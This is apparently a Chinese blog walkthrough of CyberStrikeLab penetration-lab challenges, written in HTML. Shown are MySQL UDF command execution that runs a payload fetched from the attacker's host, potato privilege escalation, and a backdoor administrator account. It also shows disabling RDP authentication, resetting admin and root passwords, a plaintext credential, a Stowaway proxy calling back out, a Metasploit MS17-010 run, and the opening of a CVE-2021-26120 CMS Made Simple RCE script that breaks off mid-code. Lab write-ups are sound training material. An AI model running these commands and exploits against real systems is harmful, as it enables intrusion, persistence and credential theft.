	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144912791_hu8676686943418327900.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144912791_hu14606743245562223687.png 1024w"
	loading="lazy"
	
		alt="image-20260131144912791"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="706px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select sys_eval(&#34;whoami&#34;);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144954153.png"
	width="692"
	height="355"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144954153_hu9819415634203285239.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144954153_hu5845282007773558781.png 1024w"
	loading="lazy"
	
		alt="image-20260131144954153"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>成功提权，这个貌似就是<code>UDF</code>提权，之前用<code>MDUT</code>打过，不知道为什么这次不能用<code>MDUT</code>连接，猜测应该是这个数据库不对外开放，只能本地连接</p>
<p>接下来先上线CS，然后土豆提权吧，在数据库这里执行命令非常的慢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select sys_eval(&#39;C:/Users/Public/4444.exe http://172.30.58.42:8888/S2/4444.txt&#39;);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">connect 172.30.58.77
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131150603676.png"
	width="586"
	height="240"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131150603676_hu14966647660961482894.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131150603676_hu18310805999331247940.png 1024w"
	loading="lazy"
	
		alt="image-20260131150603676"
	
	
		class="gallery-image" 
		data-flex-grow="244"
		data-flex-basis="586px"
	
></p>
<p>然后土豆提权，和之前一样用坏土豆</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;\&#34;C:\Users\Public\4444.exe\&#34; http://172.30.58.42:8888/S2/4444.txt&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131151150020.png"
	width="566"
	height="328"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131151150020_hu17590020807431701412.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131151150020_hu6175905886442016189.png 1024w"
	loading="lazy"
	
		alt="image-20260131151150020"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="414px"
	
></p>
<p>直接读flag就行</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131151316937.png"
	width="937"
	height="548"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131151316937_hu10900104147917364350.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131151316937_hu14426051323593001200.png 1024w"
	loading="lazy"
	
		alt="image-20260131151316937"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="410px"
	
></p>
<h3 id="flag4-1">flag4
</h3><h4 id="知识点获取rdp密码登录rdp">知识点：获取RDP密码登录RDP
</h4><div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>172.30.58.42</td>
<td>外网机（拿下）</td>
</tr>
<tr>
<td>172.30.58.77</td>
<td>WIN-UPQLOPM011B 存在web服务 （拿下）</td>
</tr>
<tr>
<td>172.30.58.78</td>
<td>只开放了22端口</td>
</tr>
<tr>
<td>172.30.58.79</td>
<td>WIN-85B7F32VC8H 8085端口存在web服务（拿下）</td>
</tr>
</tbody>
</table></div>
<p>我们需要横向到<code>78</code>这台，当然也看一下<code>77</code>有没有内网网卡</p>
<p>只有一张网卡</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131152902327.png"
	width="803"
	height="344"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131152902327_hu3896482107234460247.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131152902327_hu17795122031438019308.png 1024w"
	loading="lazy"
	
		alt="image-20260131152902327"
	
	
		class="gallery-image" 
		data-flex-grow="233"
		data-flex-basis="560px"
	
></p>
<p>横向<code>77</code>这台，我们回到之前79那台机子，之前是说有个<code>xshell</code>的，既然有，我们开个RDP上去，看看xshell里面可不可以连接上<code>78</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user liernian qwer123! /add
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">shell net localgroup Administrators liernian /add
</span></span></code></pre></td></tr></table>
</div>
</div><p>关防火墙和开RDP可以在插件做到，还需要关闭身份验证</p>
<p>（这个还是在之前那个冰蝎里搞比较方便）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /d 0 /f	
</span></span></code></pre></td></tr></table>
</div>
</div><p>不过要是实战的话，还是抓取本地RDP密码比较靠谱，登录之后才想起来，我新创建的用户，怎么可能会有使用xshell的记录，这里还是必须要登录管理员的的RDP（所以上面又是无用功了）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155509986.png"
	width="1376"
	height="730"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155509986_hu16621678943737069216.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155509986_hu13126062292817290337.png 1024w"
	loading="lazy"
	
		alt="image-20260131155509986"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="452px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155514953.png"
	width="606"
	height="312"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155514953_hu6384076174037915213.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155514953_hu629134845757691648.png 1024w"
	loading="lazy"
	
		alt="image-20260131155514953"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="466px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Administrator/aviator!321
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里没有插件也没事，可以直接修改管理员的密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user Administrator qwer123! 
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后RDP登录，已经有连接了，还是root，直接读</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155805021.png"
	width="1663"
	height="648"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155805021_hu15576151130669603202.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155805021_hu5335302013796632408.png 1024w"
	loading="lazy"
	
		alt="image-20260131155805021"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="615px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155842216.png"
	width="641"
	height="255"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155842216_hu9316633570732468379.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131155842216_hu13995768614165175603.png 1024w"
	loading="lazy"
	
		alt="image-20260131155842216"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="603px"
	
></p>
<h3 id="flag5">flag5
</h3><h4 id="知识点stowaway二级代理ms17010">知识点：stowaway二级代理、MS17010
</h4><p>不用想，肯定有内网在，我们传一个<code>stowaway</code>上去</p>
<p>又有杀软，关掉就行</p>
<p>还不能直接传，真是。。。</p>
<p>我们改个密码，在本地登录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo root:qwer123|chpasswd
</span></span></code></pre></td></tr></table>
</div>
</div><p>还得是<code>finalshell</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131161306882.png"
	width="1348"
	height="844"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131161306882_hu12958999997670640676.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131161306882_hu5444505394320262159.png 1024w"
	loading="lazy"
	
		alt="image-20260131161306882"
	
	
		class="gallery-image" 
		data-flex-grow="159"
		data-flex-basis="383px"
	
></p>
<p>我服了，无法上传，不知道什么原因，回头搞一下xshell</p>
<p>发现点了这个上传文件后，就可以通过sftp上传了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131163458243.png"
	width="1204"
	height="881"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131163458243_hu14476439465290609745.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131163458243_hu12442095538307101587.png 1024w"
	loading="lazy"
	
		alt="image-20260131163458243"
	
	
		class="gallery-image" 
		data-flex-grow="136"
		data-flex-basis="327px"
	
></p>
<p>建立二级代理</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">listen
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">5555
</span></span><span class="line"><span class="cl">./linux_x64_agent -c 172.30.58.42:5555
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后扫一下</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131164434035.png"
	width="1100"
	height="464"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131164434035_hu15403664906559485450.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131164434035_hu986577964624352790.png 1024w"
	loading="lazy"
	
		alt="image-20260131164434035"
	
	
		class="gallery-image" 
		data-flex-grow="237"
		data-flex-basis="568px"
	
></p>
<p>扫出来一个<code>MS17-010</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131164631554.png"
	width="669"
	height="445"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131164631554_hu18134594132968591827.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131164631554_hu16496425020978013335.png 1024w"
	loading="lazy"
	
		alt="image-20260131164631554"
	
	
		class="gallery-image" 
		data-flex-grow="150"
		data-flex-basis="360px"
	
></p>
<p>直接<code>MSF</code>，这里还必须设一下这个<code>1433</code>，默认的4444不行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">proxychains</span> <span class="o">-</span><span class="n">q</span> <span class="n">msfconsole</span>
</span></span><span class="line"><span class="cl"><span class="n">search</span> <span class="n">ms17</span>
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp_uuid</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">rhosts</span> <span class="mf">10.2</span><span class="o">.</span><span class="mf">2.54</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">1433</span>
</span></span><span class="line"><span class="cl"><span class="n">run</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131165355620.png"
	width="1090"
	height="200"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131165355620_hu9435550199816306674.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131165355620_hu4880964585121582539.png 1024w"
	loading="lazy"
	
		alt="image-20260131165355620"
	
	
		class="gallery-image" 
		data-flex-grow="545"
		data-flex-basis="1308px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131165821604.png"
	width="1297"
	height="406"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131165821604_hu2112524316090152686.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131165821604_hu15083696349051327238.png 1024w"
	loading="lazy"
	
		alt="image-20260131165821604"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="766px"
	
></p>
<h2 id="gear">Gear
</h2><h3 id="flag1-13">flag1
</h3><h4 id="知识点cms-made-simple历史漏洞">知识点：CMS Made Simple历史漏洞
</h4><p>入口点是域名，我们需要解析一下域名</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203203457186.png"
	width="756"
	height="355"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203203457186_hu8963237958693978669.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203203457186_hu2223320428831386828.png 1024w"
	loading="lazy"
	
		alt="image-20260203203457186"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="511px"
	
></p>
<p>直接ping一下</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203210042932.png"
	width="826"
	height="319"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203210042932_hu14220176802298006337.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203210042932_hu2305197650141307521.png 1024w"
	loading="lazy"
	
		alt="image-20260203210042932"
	
	
		class="gallery-image" 
		data-flex-grow="258"
		data-flex-basis="621px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">172.10.59.35
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>fscan</code>开扫</p>
<p>发现有个233端口，不过没什么用</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203210455835.png"
	width="1537"
	height="629"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203210455835_hu3251492969190711022.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203210455835_hu3648641921723760819.png 1024w"
	loading="lazy"
	
		alt="image-20260203210455835"
	
	
		class="gallery-image" 
		data-flex-grow="244"
		data-flex-basis="586px"
	
></p>
<p>回到之前那个网站</p>
<p>是一个<code>CMS Made Simple</code>，搞一下<code>nday</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">lxml</span> <span class="kn">import</span> <span class="n">etree</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">usr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">uri</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">admin/login.php&#34;</span> <span class="o">%</span> <span class="n">t</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span> <span class="p">:</span> <span class="n">usr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span> <span class="p">:</span> <span class="n">usr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;loginsubmit&#34;</span> <span class="p">:</span> <span class="s2">&#34;Submit&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;style.php\?__c=(.*)</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="k">match</span><span class="p">,</span> <span class="s2">&#34;(-) login failed&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">trigger_or_patch_ssti</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">csrf</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">tpl</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># CVE-2021-26120</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;mact&#34;</span><span class="p">:</span> <span class="s1">&#39;DesignManager,m1_,admin_edit_template,0&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__c&#34;</span> <span class="p">:</span> <span class="n">csrf</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;m1_tpl&#34;</span> <span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;m1_submit&#34;</span> <span class="p">:</span> <span class="s2">&#34;Submit&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;m1_name&#34;</span> <span class="p">:</span> <span class="s2">&#34;Simplex&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;m1_contents&#34;</span> <span class="p">:</span> <span class="n">tpl</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">admin/moduleinterface.php&#34;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{},</span> <span class="n">data</span><span class="o">=</span><span class="n">d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="s2">&#34;rce()&#34;</span> <span class="ow">in</span> <span class="n">tpl</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">index.php&#34;</span> <span class="o">%</span> <span class="n">t</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="p">(</span><span class="s2">&#34;endrce&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">),</span> <span class="s2">&#34;(-) rce failed!&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmdr</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;endrce&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">cmdr</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">determine_bool</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">exp</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">       <span class="s2">&#34;mact&#34;</span> <span class="p">:</span> <span class="s2">&#34;News,m1_,default,0&#34;</span><span class="p">,</span>
